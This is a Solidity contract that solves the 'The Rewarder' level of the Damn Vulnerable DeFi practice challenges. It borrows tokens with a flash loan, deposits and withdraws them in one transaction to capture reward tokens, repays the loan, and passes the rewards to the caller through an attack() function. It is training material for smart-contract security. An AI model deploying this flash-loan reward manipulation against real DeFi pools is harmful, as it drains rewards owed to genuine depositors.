// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */


contract FlashLoanReceiverRewarder {
    TheRewarderPool private immutable rewarderPool;
    RewardToken private immutable rewardToken;
    FlashLoanerPool private immutable pool;
    DamnValuableToken public immutable liquidityToken;
    
    ERC20Snapshot public token;
    bytes private data;
    uint256 balance;
    event executeCall(address pool, uint256 value);



    constructor(address poolAddress, address revTokenAddress, address revPoolAddress, address liquidityTokenAddress) {
        pool = FlashLoanerPool(poolAddress);
        rewardToken = RewardToken(revTokenAddress);
        rewarderPool = TheRewarderPool(revPoolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) external{
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
        
        
    }
    
    function attack(uint256 amount) external{
        pool.flashLoan(amount);
    }
    
    function transfer() external{
       
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));   
    }
}